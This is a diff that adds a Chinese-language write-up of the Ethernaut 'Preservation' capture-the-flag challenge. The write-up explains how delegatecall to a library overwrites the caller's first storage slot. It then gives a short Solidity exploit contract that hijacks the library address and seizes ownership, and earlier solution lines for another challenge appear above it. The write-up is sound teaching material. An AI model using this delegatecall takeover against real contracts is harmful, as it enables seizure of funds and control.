@@ -372,3 +372,59 @@ unchecked {
 await contract.approve(player, await contract.balanceOf(player))
 await contract.transferFrom(player, contract.address, await contract.allowance(player, player))
 ```
+
+## Preservation
+
+简而言之，challenge代码有中三个storage变量：
+
+```solidity
+address public timeZone1Library;
+address public timeZone2Library;
+address public owner; 
+```
+
+根据上面Privacy题中学到的，它们分别存放在3个slot中。
+
+其中两个timeZone变量，初始化时指向此合约示例：
+
+```solidity
+contract LibraryContract {
+  uint storedTime;  
+  function setTime(uint _time) public {
+    storedTime = _time;
+  }
+}
+```
+
+又有函数：
+
+```solidity
+function setFirstTime(uint _timeStamp) public {
+  timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
+}
+```
+
+从上面Delegation题中学到，调用`delegatecall`时，执行环境为调用者。这里原`LibraryContract`合约只有一个变量
+因此修改时，也只会修改到调用者的第一个slot
+但第一个slot正好是timeZone1Library，因此修改后可以通过再次执行`setFirstTime`做到任意代码执行
+
+exp：
+
+```solidity
+contract exp {
+    address public target;
+    uint public rouge_code_address;
+    address public next_owner;
+    constructor(address _target) public {
+        target = _target;
+    }
+    function attack() public {
+        Preservation(target).setFirstTime(uint(address(this)));
+        Preservation(target).setFirstTime(uint(0));
+    }
+    function setTime(uint _) public {
+        next_owner = tx.origin;
+    }
+}
+```
+
